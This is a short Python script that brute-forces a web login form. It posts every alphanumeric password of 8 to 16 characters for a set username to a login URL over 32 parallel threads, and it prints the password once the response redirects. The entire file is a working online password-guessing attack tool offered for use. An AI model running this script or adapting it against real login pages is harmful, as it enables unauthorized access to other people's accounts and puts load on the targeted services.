#!/usr/bin/env python3

from itertools import product
from threading import Thread
from http.client import responses
import requests, sys, os

# global var for ending script
end = False

# thread config
pool_limit = 32
threads = [Thread()] * pool_limit

# action url of form
url = "http://www.example.com/login.php"

# set of chars to choose from
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# range of password lengths
pass_min = 8
pass_max = 16

# dict of form fields
data = {
    'username': 'MyUsername',
}

def login(attempt):
    global end
    password = ''.join(attempt)
    data['password'] = password
    print("Trying {}...".format(password))
    r = requests.post(url, data=data)

    if r.status_code != 200:
        print(
            "{}: {}: {}".format(
                os.path.basename(sys.argv[0]),
                r.status_code,
                responses[r.status_code],
            )
        )

        end = True
    elif r.url != url:
        print("Password: {}".format(password))
        end = True

def main():
    i = 0
    for length in range(pass_min, pass_max + 1):
        to_attempt = product(chars, repeat=length)
        for attempt in to_attempt:
            if end:
                return

            if threads[i].is_alive():
                threads[i].join()

            threads[i] = Thread(target=login, args=(attempt,))
            threads[i].start()
            i = (i + 1) % pool_limit


if __name__ == "__main__":
    main()
